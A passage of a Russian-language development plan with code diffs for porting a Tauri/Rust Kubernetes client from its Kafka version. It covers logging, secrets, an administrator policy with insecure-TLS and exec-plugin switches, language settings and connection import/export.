+| `src-tauri/src/secrets.rs` | `src-tauri/src/secrets.rs` | `8bbd0bd` | адаптирован: поля секретов подключения |
+| `src-tauri/src/error.rs` | `src-tauri/src/error.rs` | `8bbd0bd` | адаптирован: коды Kubernetes, без librdkafka |
diff --git a/src-tauri/Cargo.toml b/src-tauri/Cargo.toml
--- a/src-tauri/Cargo.toml
+++ b/src-tauri/Cargo.toml
@@ -21,6 +21,10 @@ tauri-plugin-opener = "2"
 tauri-plugin-dialog = "2"
 serde = { version = "1", features = ["derive"] }
 serde_json = "1"
+thiserror = "2"
+tracing = "0.1"
+tracing-subscriber = { version = "0.3", features = ["env-filter", "registry", "fmt"] }
+keyring = { version = "3", features = ["apple-native", "windows-native", "sync-secret-service"] }
 
 [dev-dependencies]
 tempfile = "3"
diff --git a/src-tauri/src/lib.rs b/src-tauri/src/lib.rs
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -1,10 +1,28 @@
+#[macro_use]
+pub mod i18n;
+mod dock_name;
+pub mod error;
+pub mod logging;
 pub mod product;
+pub mod secrets;
+pub mod storage;
+pub mod sync;
+
+use tauri::Manager;
 
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
 pub fn run() {
     tauri::Builder::default()
         .plugin(tauri_plugin_opener::init())
         .plugin(tauri_plugin_dialog::init())
+        .setup(|app| {
+            crate::logging::init(&app.path().app_log_dir()?);
+            tracing::info!(version = env!("CARGO_PKG_VERSION"), "starting");
+            if !crate::dock_name::set(crate::product::PRODUCT_NAME) {
+                tracing::warn!("dock name was not set: LaunchServices refused");
+            }
+            Ok(())
+        })
         .run(tauri::generate_context!())
         .expect("error while building tauri application");
 }
````

Применить: `python3 /tmp/o1a-blocks.py step 2.3`.

- [ ] **Step 4: Проверки.**

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 19 passed; 0 failed`

Run: `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`  
Expected: PASS — без предупреждений

Run: `cargo fmt --manifest-path src-tauri/Cargo.toml --check`  
Expected: PASS — без изменений

- [ ] **Step 5: Commit.**

```bash
git add -A
git commit -s -m "feat(core): основа Rust из Kafka-версии — тексты, ошибки, файлы, секреты, журнал" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 3: Политика администратора с `allowInsecureTls` и `allowExecAuth`, язык интерфейса

**Files:**
- Port: `src-tauri/src/commands/settings.rs` (с правками), `src-tauri/src/policy/mod.rs` (с правками), `src-tauri/src/policy/sources.rs` (с правками), `src-tauri/src/settings.rs` (с правками)
- Create: `docs/admin/policy.json`, `docs/admin/policy.mobileconfig`, `docs/admin/policy.reg`, `src-tauri/src/commands/mod.rs`, `src-tauri/src/state.rs`
- Modify: `PORTED.md`, `src-tauri/Cargo.toml`, `src-tauri/src/lib.rs`

**Interfaces:**
- Consumes: задача 2.
- Produces: `policy::{Policy, PolicyStatus { managed, source, updates_enabled, update_url, language, mcp_enabled, allow_insecure_tls, allow_exec_auth, errors }, KEY_ALLOW_INSECURE_TLS, KEY_ALLOW_EXEC_AUTH, resolve, sources::load}`; `settings::{LANGUAGES = ["en", "ru"], SettingsStore, language_settings, system_locale}`; `state::AppState { secrets, policy, settings }`, `AppState::{new(&Path, Arc<dyn SecretStore>), with_policy}`; `commands::blocking(f)`; команды `get_language_settings`, `set_language`, `get_policy_status`.

Спец. §5.2, §12, §16. Политика переносится с двумя новыми ключами: `allowInsecureTls` (подключения без проверки сертификата) и `allowExecAuth` (подключения с exec-плагином), оба по умолчанию `true`; нечитаемая политика или непонятое значение ключа — `false`, обновления это не выключает. Языков пока два — `en` и `ru` (`LANGUAGES`), остальные 10 добавляет этап O6; тесты сопоставления языка ОС переписаны под два языка. Примеры политики `docs/admin/*` нужны тесту источников политики и содержат оба ключа. `AppState` пока держит секреты, политику и настройки.

- [ ] **Step 1: Перенос из Kafka-версии.**

Файлы копируются с коммита `8bbd0bd` и правятся патчами (правки — против перенесённого файла).

<!-- block: shell t03-port step=3.1 -->
````bash
scripts/port.sh src-tauri/src/commands/settings.rs src-tauri/src/commands/settings.rs
scripts/port.sh src-tauri/src/policy/mod.rs src-tauri/src/policy/mod.rs
scripts/port.sh src-tauri/src/policy/sources.rs src-tauri/src/policy/sources.rs
scripts/port.sh src-tauri/src/settings.rs src-tauri/src/settings.rs
````

<!-- block: patch t03-port-src-tauri-src-commands-settings-rs step=3.1 -->
````diff
diff --git a/src-tauri/src/commands/settings.rs b/src-tauri/src/commands/settings.rs
--- a/src-tauri/src/commands/settings.rs
+++ b/src-tauri/src/commands/settings.rs
@@ -58,7 +58,7 @@ mod tests {
     }
 
     #[test]
-    fn free_can_pick_any_language() {
+    fn user_picks_a_language() {
         let dir = tempfile::tempdir().unwrap();
         let st = state(dir.path());
         let r = apply_language(&st, Some("ru")).unwrap();
@@ -66,24 +66,23 @@ mod tests {
             (r.effective.as_str(), r.reason),
             ("ru", LanguageReason::User)
         );
-        let r = apply_language(&st, Some("de")).unwrap();
+        let r = apply_language(&st, Some("en")).unwrap();
         assert_eq!(
             (r.effective.as_str(), r.reason),
-            ("de", LanguageReason::User)
+            ("en", LanguageReason::User)
         );
-        assert_eq!(st.settings.language().as_deref(), Some("de"));
+        assert_eq!(st.settings.language().as_deref(), Some("en"));
         let r = apply_language(&st, None).unwrap();
         assert_eq!(r.chosen, None);
     }
 
     #[test]
-    fn any_language_can_be_picked_without_a_key() {
+    fn unknown_language_is_rejected() {
         let dir = tempfile::tempdir().unwrap();
         let st = state(dir.path());
-        let r = apply_language(&st, Some("pt-BR")).unwrap();
         assert_eq!(
-            (r.effective.as_str(), r.reason),
-            ("pt-BR", LanguageReason::User)
+            apply_language(&st, Some("de")).unwrap_err().code,
+            ErrorCode::InvalidInput
         );
     }
 
````

<!-- block: patch t03-port-src-tauri-src-policy-mod-rs step=3.1 -->
````diff
diff --git a/src-tauri/src/policy/mod.rs b/src-tauri/src/policy/mod.rs
--- a/src-tauri/src/policy/mod.rs
+++ b/src-tauri/src/policy/mod.rs
@@ -12,6 +12,8 @@ pub const KEY_UPDATES_ENABLED: &str = "updatesEnabled";
 pub const KEY_UPDATE_URL: &str = "updateUrl";
 pub const KEY_LANGUAGE: &str = "language";
 pub const KEY_MCP_ENABLED: &str = "mcpEnabled";
+pub const KEY_ALLOW_INSECURE_TLS: &str = "allowInsecureTls";
+pub const KEY_ALLOW_EXEC_AUTH: &str = "allowExecAuth";
 
 #[derive(Debug, Clone, PartialEq)]
 pub enum PolicyValue {
@@ -72,6 +74,10 @@ pub struct PolicyStatus {
     pub language: Option<String>,
     /// `false` — MCP-шлюз запрещён администратором (спец. G1 §9).
     pub mcp_enabled: bool,
+    /// `false` — подключения с `insecure-skip-tls-verify` запрещены администратором (спец. §12).
+    pub allow_insecure_tls: bool,
+    /// `false` — подключения с exec-плагином запрещены администратором (спец. §5.2, §12).
+    pub allow_exec_auth: bool,
     pub errors: Vec<LocalizedText>,
 }
 
@@ -84,6 +90,8 @@ impl Default for PolicyStatus {
             update_url: None,
             language: None,
             mcp_enabled: true,
+            allow_insecure_tls: true,
+            allow_exec_auth: true,
             errors: Vec::new(),
         }
     }
@@ -106,6 +114,8 @@ pub fn resolve(source: &str, raw: RawPolicy) -> Policy {
                     source: Some(source.to_string()),
                     updates_enabled: false,
                     mcp_enabled: false,
+                    allow_insecure_tls: false,
+                    allow_exec_auth: false,
                     errors: vec![ltext!(
                         "errors.policy.unreadable",
                         "Policy cannot be read: {{reason}}",
@@ -158,11 +168,26 @@ pub fn resolve(source: &str, raw: RawPolicy) -> Policy {
                 status.mcp_enabled = false;
                 status.errors.push(other.invalid(&key));
             }
+            (KEY_ALLOW_INSECURE_TLS, PolicyValue::Bool(b)) => status.allow_insecure_tls = b,
+            (KEY_ALLOW_INSECURE_TLS, PolicyValue::Int(i @ (0 | 1))) => {
+                status.allow_insecure_tls = i == 1
+            }
+            // Непонятое значение запрещает подключения без проверки сертификата.
+            (KEY_ALLOW_INSECURE_TLS, other) => {
+                status.allow_insecure_tls = false;
+                status.errors.push(other.invalid(&key));
+            }
+            (KEY_ALLOW_EXEC_AUTH, PolicyValue::Bool(b)) => status.allow_exec_auth = b,
+            (KEY_ALLOW_EXEC_AUTH, PolicyValue::Int(i @ (0 | 1))) => status.allow_exec_auth = i == 1,
+            // Непонятое значение запрещает exec-плагины.
+            (KEY_ALLOW_EXEC_AUTH, other) => {
+                status.allow_exec_auth = false;
+                status.errors.push(other.invalid(&key));
+            }
             (KEY_UPDATES_ENABLED | KEY_UPDATE_URL, other) => {
                 broken = true;
                 status.errors.push(other.invalid(&key));
             }
-            // Сюда же попадает `licenseKey` политик версий 0.2.x: ключи больше не используются.
             (unknown, _) => tracing::warn!("unknown policy key “{unknown}” ignored"),
         }
     }
@@ -220,7 +245,7 @@ mod tests {
         assert!(
             resolve(
                 "src",
-                values(&[("language", PolicyValue::Str("de".into()))])
+                values(&[("language", PolicyValue::Str("ru".into()))])
             )
             .status
             .mcp_enabled
@@ -256,9 +281,9 @@ mod tests {
     fn language_policy() {
         let p = resolve(
             "src",
-            values(&[("language", PolicyValue::Str("de".into()))]),
+            values(&[("language", PolicyValue::Str("ru".into()))]),
         );
-        assert_eq!(p.status.language.as_deref(), Some("de"));
+        assert_eq!(p.status.language.as_deref(), Some("ru"));
         assert!(p.status.errors.is_empty());
 
         let p = resolve(
@@ -341,38 +366,53 @@ mod tests {
     }
 
     #[test]
-    fn legacy_license_key_is_ignored() {
-        // Политика версий 0.2.x с ключом организации: не ошибка, ключ никуда не попадает.
+    fn insecure_tls_policy() {
+        assert!(resolve("src", RawPolicy::Absent).status.allow_insecure_tls);
+        for (v, allowed) in [
+            (PolicyValue::Bool(false), false),
+            (PolicyValue::Bool(true), true),
+            (PolicyValue::Int(0), false),
+            (PolicyValue::Int(1), true),
+        ] {
+            let p = resolve("src", values(&[("allowInsecureTls", v)]));
+            assert_eq!(p.status.allow_insecure_tls, allowed);
+            assert!(p.status.errors.is_empty());
+        }
         let p = resolve(
             "src",
-            values(&[("licenseKey", PolicyValue::Str("secret.key".into()))]),
+            values(&[("allowInsecureTls", PolicyValue::Str("no".into()))]),
         );
-        assert!(p.status.managed);
+        assert!(!p.status.allow_insecure_tls, "непонятое значение запрещает");
         assert!(p.status.updates_enabled);
-        assert!(p.status.mcp_enabled);
-        assert!(p.status.errors.is_empty());
-        let json = serde_json::to_string(&p.status).unwrap();
-        assert!(!json.contains("secret.key"));
-        assert!(!json.to_lowercase().contains("license"));
-
-        // Значение другого типа тоже не ошибка и не мешает соседним ключам.
-        let p = resolve(
-            "src",
-            values(&[
-                ("licenseKey", PolicyValue::Int(1)),
-                (
-                    "updateUrl",
-                    PolicyValue::Str("https://mirror.corp/latest.json".into()),
-                ),
-                ("language", PolicyValue::Str("de".into())),
-            ]),
+        assert_eq!(p.status.errors[0].key, "errors.policy.invalidString");
+        assert!(
+            !resolve("src", RawPolicy::Unreadable("x".into()))
+                .status
+                .allow_insecure_tls
         );
-        assert!(p.status.errors.is_empty());
+    }
+
+    #[test]
+    fn exec_auth_policy() {
+        assert!(resolve("src", RawPolicy::Absent).status.allow_exec_auth);
+        for (v, allowed) in [
+            (PolicyValue::Bool(false), false),
+            (PolicyValue::Bool(true), true),
+            (PolicyValue::Int(0), false),
+            (PolicyValue::Int(1), true),
+        ] {
+            let p = resolve("src", values(&[("allowExecAuth", v)]));
+            assert_eq!(p.status.allow_exec_auth, allowed);
+            assert!(p.status.errors.is_empty());
+        }
+        let p = resolve("src", values(&[("allowExecAuth", PolicyValue::Int(2))]));
+        assert!(!p.status.allow_exec_auth, "непонятое значение запрещает");
         assert!(p.status.updates_enabled);
-        assert_eq!(
-            p.status.update_url.as_deref(),
-            Some("https://mirror.corp/latest.json")
+        assert!(p.status.allow_insecure_tls, "другие ключи не задеты");
+        assert!(
+            !resolve("src", RawPolicy::Unreadable("x".into()))
+                .status
+                .allow_exec_auth
         );
-        assert_eq!(p.status.language.as_deref(), Some("de"));
     }
 }
````

<!-- block: patch t03-port-src-tauri-src-policy-sources-rs step=3.1 -->
````diff
diff --git a/src-tauri/src/policy/sources.rs b/src-tauri/src/policy/sources.rs
--- a/src-tauri/src/policy/sources.rs
+++ b/src-tauri/src/policy/sources.rs
@@ -214,6 +214,11 @@ mod tests {
         assert!(p.status.update_url.is_some());
         assert_eq!(p.status.language.as_deref(), Some("en"));
         assert!(!p.status.mcp_enabled, "пример запрещает MCP");
+        assert!(
+            !p.status.allow_insecure_tls,
+            "пример запрещает подключения без проверки TLS"
+        );
+        assert!(!p.status.allow_exec_auth, "пример запрещает exec-плагины");
 
         // Профиль MDM: содержимое PayloadContent[0] попадает в Managed Preferences как есть.
         let profile = plist::Value::from_file(format!("{base}/policy.mobileconfig")).unwrap();
@@ -228,7 +233,14 @@ mod tests {
             content.get("PayloadType").and_then(|v| v.as_string()),
             Some(crate::product::IDENTIFIER)
         );
-        for key in ["updatesEnabled", "updateUrl", "language", "mcpEnabled"] {
+        for key in [
+            "updatesEnabled",
+            "updateUrl",
+            "language",
+            "mcpEnabled",
+            "allowInsecureTls",
+            "allowExecAuth",
+        ] {
             assert!(content.contains_key(key), "{key}");
         }
         assert_eq!(
@@ -243,5 +255,10 @@ mod tests {
             crate::product::POLICY_PRODUCT
         )));
         assert!(reg.contains(r#""mcpEnabled"=dword:00000000"#), "{reg}");
+        assert!(
+            reg.contains(r#""allowInsecureTls"=dword:00000000"#),
+            "{reg}"
+        );
+        assert!(reg.contains(r#""allowExecAuth"=dword:00000000"#), "{reg}");
     }
 }
````

<!-- block: patch t03-port-src-tauri-src-settings-rs step=3.1 -->
````diff
diff --git a/src-tauri/src/settings.rs b/src-tauri/src/settings.rs
--- a/src-tauri/src/settings.rs
+++ b/src-tauri/src/settings.rs
@@ -9,9 +9,9 @@ use crate::error::{AppResult, ErrorCode};
 use crate::storage::fs::{read_json, read_json_or_quarantine, write_json};
 use crate::sync::RwLockExt;
 
-pub const LANGUAGES: [&str; 12] = [
-    "en", "ru", "de", "fr", "es", "it", "pl", "pt-BR", "zh-CN", "zh-TW", "ja", "ko",
-];
+/// Языки, для которых есть словарь `src/locales/<код>.json`. Остальные 10 языков Kafka-версии
+/// добавляются на этапе O6 (спец. §16).
+pub const LANGUAGES: [&str; 2] = ["en", "ru"];
 
 fn is_known(code: &str) -> bool {
     LANGUAGES.contains(&code)
@@ -272,11 +272,10 @@ mod tests {
 
     #[test]
     fn matching_system_tags() {
-        assert_eq!(match_language("de-AT"), Some("de"));
         assert_eq!(match_language("ru_RU"), Some("ru"));
-        assert_eq!(match_language("pt-PT"), Some("pt-BR"));
-        assert_eq!(match_language("pt"), Some("pt-BR"));
         assert_eq!(match_language("en-GB"), Some("en"));
+        assert_eq!(match_language("de-AT"), None, "словаря de пока нет");
+        assert_eq!(match_language("zh-Hans-CN"), None);
         assert_eq!(match_language("uk-UA"), None);
     }
 
@@ -314,73 +313,18 @@ mod tests {
         assert_eq!(match_language_in("ja-JP", &BEFORE_E), None);
     }
 
-    #[test]
-    fn simplified_chinese_with_real_list() {
-        for tag in ["zh-Hans-CN", "zh-CN", "zh_CN", "zh-SG", "zh", "zh-Hans-HK"] {
-            assert_eq!(match_language(tag), Some("zh-CN"), "{tag}");
-        }
-        assert_eq!(
-            resolve(Some("zh-Hans-CN"), None, None),
-            ("zh-CN".into(), LanguageReason::System)
-        );
-    }
-
-    #[test]
-    fn traditional_chinese_with_real_list() {
-        for tag in [
-            "zh-Hant-TW",
-            "zh-TW",
-            "zh_TW",
-            "zh-HK",
-            "zh-MO",
-            "zh-Hant",
-            "zh-Hant-HK",
-        ] {
-            assert_eq!(match_language(tag), Some("zh-TW"), "{tag}");
-        }
-        assert_eq!(match_language("zh-Hans-TW"), Some("zh-CN"));
-        assert_eq!(
-            resolve(Some("zh-Hant-TW"), None, None),
-            ("zh-TW".into(), LanguageReason::System)
-        );
-    }
-
-    #[test]
-    fn japanese_with_real_list() {
-        for tag in ["ja", "ja-JP", "ja_JP", "JA-jp"] {
-            assert_eq!(match_language(tag), Some("ja"), "{tag}");
-        }
-        assert_eq!(
-            resolve(Some("ja-JP"), None, None),
-            ("ja".into(), LanguageReason::System)
-        );
-    }
-
-    #[test]
-    fn korean_with_real_list() {
-        for tag in ["ko", "ko-KR", "ko_KR", "KO-kr", "ko-Kore-KR"] {
-            assert_eq!(match_language(tag), Some("ko"), "{tag}");
-        }
-        assert_eq!(
-            resolve(Some("ko-KR"), None, None),
-            ("ko".into(), LanguageReason::System)
-        );
-    }
-
     #[test]
     fn priority_of_sources() {
         use LanguageReason::*;
         assert_eq!(resolve(Some("ru-RU"), None, None), ("ru".into(), System));
-        assert_eq!(resolve(Some("de-DE"), None, None), ("de".into(), System));
         assert_eq!(resolve(Some("ru"), Some("en"), None), ("en".into(), User));
-        assert_eq!(resolve(Some("ru"), Some("fr"), None), ("fr".into(), User));
-        assert_eq!(resolve(None, Some("fr"), None), ("fr".into(), User));
+        assert_eq!(resolve(None, Some("ru"), None), ("ru".into(), User));
         assert_eq!(
-            resolve(Some("ru"), Some("fr"), Some("ru")),
+            resolve(Some("en"), Some("en"), Some("ru")),
             ("ru".into(), Policy)
         );
-        assert_eq!(resolve(Some("ru"), None, Some("de")), ("de".into(), Policy));
-        assert_eq!(resolve(Some("uk"), None, None), ("en".into(), Default));
+        assert_eq!(resolve(Some("de-DE"), None, None), ("en".into(), Default));
+        assert_eq!(resolve(None, Some("fr"), None), ("en".into(), Default));
         assert_eq!(resolve(None, None, None), ("en".into(), Default));
     }
 
````

Применить: `python3 /tmp/o1a-blocks.py step 3.1`.

- [ ] **Step 2: Реализация.**

<!-- block: file t03-docs-admin-policy-json step=3.2 path=docs/admin/policy.json -->
````json
{
  "updatesEnabled": false,
  "updateUrl": "https://mirror.example.corp/glafira-kubernetes/latest.json",
  "language": "en",
  "mcpEnabled": false,
  "allowInsecureTls": false,
  "allowExecAuth": false
}
````

<!-- block: file t03-docs-admin-policy-mobileconfig step=3.2 path=docs/admin/policy.mobileconfig -->
````xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>PayloadType</key><string>io.github.vvnovg.glafira.kubernetes</string>
      <key>PayloadIdentifier</key><string>io.github.vvnovg.glafira.kubernetes.policy</string>
      <key>PayloadUUID</key><string>00000000-0000-0000-0000-000000000001</string>
      <key>PayloadVersion</key><integer>1</integer>
      <key>updatesEnabled</key><false/>
      <key>updateUrl</key><string>https://mirror.example.corp/glafira-kubernetes/latest.json</string>
      <key>language</key><string>en</string>
      <key>mcpEnabled</key><false/>
      <key>allowInsecureTls</key><false/>
      <key>allowExecAuth</key><false/>
    </dict>
  </array>
  <key>PayloadDisplayName</key><string>Glafira for Kubernetes policy</string>
  <key>PayloadIdentifier</key><string>io.github.vvnovg.glafira.kubernetes.profile</string>
  <key>PayloadType</key><string>Configuration</string>
  <key>PayloadUUID</key><string>00000000-0000-0000-0000-000000000002</string>
  <key>PayloadVersion</key><integer>1</integer>
</dict>
</plist>
````

<!-- block: file t03-docs-admin-policy-reg step=3.2 path=docs/admin/policy.reg -->
````text
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Glafira\Kubernetes]
"updatesEnabled"=dword:00000000
"updateUrl"="https://mirror.example.corp/glafira-kubernetes/latest.json"
"language"="en"
"mcpEnabled"=dword:00000000
"allowInsecureTls"=dword:00000000
"allowExecAuth"=dword:00000000
````

<!-- block: file t03-src-tauri-src-commands-mod-rs step=3.2 path=src-tauri/src/commands/mod.rs -->
````rust
pub mod settings;

use crate::error::{AppResult, ErrorCode};

/// Блокирующие вызовы (файлы, keychain) не выполняются на async-потоках Tauri.
pub(crate) async fn blocking<T, F>(f: F) -> AppResult<T>
where
    T: Send + 'static,
    F: FnOnce() -> AppResult<T> + Send + 'static,
{
    tauri::async_runtime::spawn_blocking(f).await.map_err(|e| {
        app_err!(
            ErrorCode::Internal,
            "errors.app.taskPanicked",
            "Background task failed: {{error}}",
            error = e
        )
    })?
}
````

<!-- block: file t03-src-tauri-src-state-rs step=3.2 path=src-tauri/src/state.rs -->
````rust
use std::path::Path;
use std::sync::Arc;

use crate::error::AppResult;
use crate::secrets::SecretStore;

/// Общее состояние приложения: хранилища и политика. Клонируется дёшево (всё за `Arc`).
#[derive(Clone)]
pub struct AppState {
    pub secrets: Arc<dyn SecretStore>,
    pub policy: Arc<crate::policy::Policy>,
    pub settings: Arc<crate::settings::SettingsStore>,
}

impl AppState {
    pub fn new(data_dir: &Path, secrets: Arc<dyn SecretStore>) -> AppResult<Self> {
        std::fs::create_dir_all(data_dir)?;
        Ok(Self {
            secrets,
            policy: Arc::new(crate::policy::Policy::default()),
            settings: Arc::new(crate::settings::SettingsStore::open(data_dir)),
        })
    }

    /// Политика администратора (читается при запуске в lib.rs).
    pub fn with_policy(mut self, policy: crate::policy::Policy) -> Self {
        self.policy = Arc::new(policy);
        self
    }
}
````

<!-- block: patch t03-src step=3.2 -->
````diff
diff --git a/PORTED.md b/PORTED.md
--- a/PORTED.md
+++ b/PORTED.md
@@ -41,3 +41,12 @@
 | `src-tauri/src/dock_name.rs` | `src-tauri/src/dock_name.rs` | `8bbd0bd` | адаптирован: комментарий |
 | `src-tauri/src/secrets.rs` | `src-tauri/src/secrets.rs` | `8bbd0bd` | адаптирован: поля секретов подключения |
 | `src-tauri/src/error.rs` | `src-tauri/src/error.rs` | `8bbd0bd` | адаптирован: коды Kubernetes, без librdkafka |
+| `src-tauri/src/policy/mod.rs` | `src-tauri/src/policy/mod.rs` | `8bbd0bd` | адаптирован: ключ allowInsecureTls, языки тестов |
+| `src-tauri/src/policy/sources.rs` | `src-tauri/src/policy/sources.rs` | `8bbd0bd` | адаптирован: тест примеров с allowInsecureTls |
+| `src-tauri/src/settings.rs` | `src-tauri/src/settings.rs` | `8bbd0bd` | адаптирован: языки en и ru |
+| `src-tauri/src/commands/settings.rs` | `src-tauri/src/commands/settings.rs` | `8bbd0bd` | адаптирован: языки тестов |
+| `src-tauri/src/state.rs` | `src-tauri/src/state.rs` | `8bbd0bd` | адаптирован: только хранилища, без Kafka |
+| `src-tauri/src/commands/mod.rs` | `src-tauri/src/commands/mod.rs` | `8bbd0bd` | адаптирован: только blocking |
+| `docs/admin/policy.json` | `docs/admin/policy.json` | `8bbd0bd` | адаптирован: идентификаторы, allowInsecureTls |
+| `docs/admin/policy.mobileconfig` | `docs/admin/policy.mobileconfig` | `8bbd0bd` | адаптирован: идентификаторы, allowInsecureTls |
+| `docs/admin/policy.reg` | `docs/admin/policy.reg` | `8bbd0bd` | адаптирован: идентификаторы, allowInsecureTls |
diff --git a/src-tauri/Cargo.toml b/src-tauri/Cargo.toml
--- a/src-tauri/Cargo.toml
+++ b/src-tauri/Cargo.toml
@@ -25,6 +25,11 @@ thiserror = "2"
 tracing = "0.1"
 tracing-subscriber = { version = "0.3", features = ["env-filter", "registry", "fmt"] }
 keyring = { version = "3", features = ["apple-native", "windows-native", "sync-secret-service"] }
+plist = "1"
+sys-locale = "0.3"
+
+[target.'cfg(windows)'.dependencies]
+winreg = "0.55"
 
 [dev-dependencies]
 tempfile = "3"
diff --git a/src-tauri/src/lib.rs b/src-tauri/src/lib.rs
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -1,15 +1,24 @@
 #[macro_use]
 pub mod i18n;
+pub mod commands;
 mod dock_name;
 pub mod error;
 pub mod logging;
+pub mod policy;
 pub mod product;
 pub mod secrets;
+pub mod settings;
+pub mod state;
 pub mod storage;
 pub mod sync;
 
+use std::sync::Arc;
+
 use tauri::Manager;
 
+use crate::secrets::KeyringStore;
+use crate::state::AppState;
+
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
 pub fn run() {
     tauri::Builder::default()
@@ -21,8 +30,18 @@ pub fn run() {
             if !crate::dock_name::set(crate::product::PRODUCT_NAME) {
                 tracing::warn!("dock name was not set: LaunchServices refused");
             }
+            let dir = app.path().app_data_dir()?;
+            let policy = crate::policy::sources::load();
+            tracing::info!(managed = policy.status.managed, "policy");
+            let st = AppState::new(&dir, Arc::new(KeyringStore::default()))?.with_policy(policy);
+            app.manage(st);
             Ok(())
         })
+        .invoke_handler(tauri::generate_handler![
+            commands::settings::get_language_settings,
+            commands::settings::set_language,
+            commands::settings::get_policy_status,
+        ])
         .run(tauri::generate_context!())
         .expect("error while building tauri application");
 }
````

Применить: `python3 /tmp/o1a-blocks.py step 3.2`.

- [ ] **Step 3: Проверки.**

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 46 passed; 0 failed`

Run: `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`  
Expected: PASS — без предупреждений

Run: `cargo fmt --manifest-path src-tauri/Cargo.toml --check`  
Expected: PASS — без изменений

- [ ] **Step 4: Commit.**

```bash
git add -A
git commit -s -m "feat(core): политика администратора с ключами allowInsecureTls и allowExecAuth, настройки языка (en, ru)" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 4: Профиль подключения, хранилище, папки, экспорт и импорт

**Files:**
- Port: `src-tauri/src/commands/folders.rs` (с правками), `src-tauri/src/storage/connections.rs` (с правками), `src-tauri/src/storage/exchange.rs` (с правками), `src-tauri/src/storage/tree.rs`
- Create: `src-tauri/src/storage/profile.rs`, `src-tauri/src/storage/testdata/test-cert.pem`, `src-tauri/src/storage/testdata/test-key.pem`
- Modify: `PORTED.md`, `src-tauri/Cargo.toml`, `src-tauri/src/commands/mod.rs`, `src-tauri/src/lib.rs`, `src-tauri/src/state.rs`, `src-tauri/src/storage/mod.rs`

**Interfaces:**
- Consumes: задачи 2–3.
- Produces: `storage::profile::{Environment, AuthConfig::{Token, Browser, ClientCert { certificate_pem }}, AuthConfig::uses_token, CaConfig::{System, Pem { pem }, Insecure}, ProxyConfig::{System, None, Url { url }}, ConnectionProfile { id, name, color, environment, read_only, api_url, auth, ca, tls_server_name, proxy, favorite_namespaces, manual_namespaces, request_timeout_ms, connect_timeout_ms, folder_id, order, extra }, normalize_profile, pem_certificates(&str) -> Result<Vec<Vec<u8>>, String>, is_valid_namespace, validate_profile}`, в тестах — `sample_profile(id)`, `TEST_CERT_PEM`; `storage::connections::{ConnectionStore, ConnectionFolder, StoreData}` (`open`, `list`, `list_folders`, `get`, `upsert`, `delete`, `snapshot`, `update`); `storage::exchange::{EXCHANGE_FORMAT, NeedsSecret, build_export, parse_exchange, ImportOptions { target, update_existing, allow_insecure_tls }, ImportPreview { …, needs_secrets }, plan_import}`; `AppState.connections`; команды `list_folders`, `create_folder`, `rename_folder`, `delete_folder`, `move_items`, `export_connections`, `preview_import`, `apply_import`.

Спец. §5.1, §5.5. Профиль (`storage/profile.rs`) пишется заново: адрес API (допускается путь — прокси Rancher `…/k8s/clusters/<id>`; строка запроса и фрагмент — нет), способ входа (`token` / `browser` / `clientCert`; exec-плагин добавляет задача 9), CA (`system` / `pem` / `insecure`), имя для проверки TLS, прокси, избранные и ручные проекты, два таймаута; секретов в профиле нет. Хранилище `connections.rs`, папки `tree.rs` и обмен `exchange.rs` переносятся из Kafka-версии: из `connections.rs` убраны типы Kafka (профиль реэкспортируется из `profile.rs`), `upsert` нормализует профиль; обмен получает формат `glafira-kubernetes-connections`, флаги `needsSecret { token, clientKey }` вместо паролей и пропуск подключений `insecure`, если их запрещает политика. Тестовый самоподписанный сертификат и ключ — `storage/testdata/`.

- [ ] **Step 1: Перенос из Kafka-версии.**

Файлы копируются с коммита `8bbd0bd` и правятся патчами (правки — против перенесённого файла).

<!-- block: shell t04-port step=4.1 -->
````bash
scripts/port.sh src-tauri/src/commands/folders.rs src-tauri/src/commands/folders.rs
scripts/port.sh src-tauri/src/storage/connections.rs src-tauri/src/storage/connections.rs
scripts/port.sh src-tauri/src/storage/exchange.rs src-tauri/src/storage/exchange.rs
scripts/port.sh src-tauri/src/storage/tree.rs src-tauri/src/storage/tree.rs
````

<!-- block: patch t04-port-src-tauri-src-commands-folders-rs step=4.1 -->
````diff
diff --git a/src-tauri/src/commands/folders.rs b/src-tauri/src/commands/folders.rs
--- a/src-tauri/src/commands/folders.rs
+++ b/src-tauri/src/commands/folders.rs
@@ -59,7 +59,7 @@ pub async fn move_items(
     .await
 }
 
-/// Пишет файл `glafira-connections` (всё дерево или папку `folder_id`) без секретов.
+/// Пишет файл `glafira-kubernetes-connections` (всё дерево или папку `folder_id`) без секретов.
 #[tauri::command]
 pub async fn export_connections(
     state: State<'_, AppState>,
@@ -149,22 +149,16 @@ fn import_from_file(
     let opts = ImportOptions {
         target,
         update_existing,
+        allow_insecure_tls: st.policy.status.allow_insecure_tls,
     };
-    let file_exists = |p: &str| Path::new(p).is_file();
     if !apply {
-        return Ok(plan_import(&st.connections.snapshot(), &parsed, &opts, &file_exists)?.preview);
+        return Ok(plan_import(&st.connections.snapshot(), &parsed, &opts)?.preview);
     }
-    let preview = st.connections.update(|data| {
-        let plan = plan_import(data, &parsed, &opts, &file_exists)?;
+    st.connections.update(|data| {
+        let plan = plan_import(data, &parsed, &opts)?;
         *data = plan.next;
         Ok(plan.preview)
-    })?;
-    // Живые сессии обновлённых подключений работают со старым профилем — как при сохранении формы.
-    for item in &preview.updated {
-        st.sessions.cancel_for(&item.id);
-        st.evict_connection(&item.id);
-    }
-    Ok(preview)
+    })
 }
 
 #[cfg(test)]
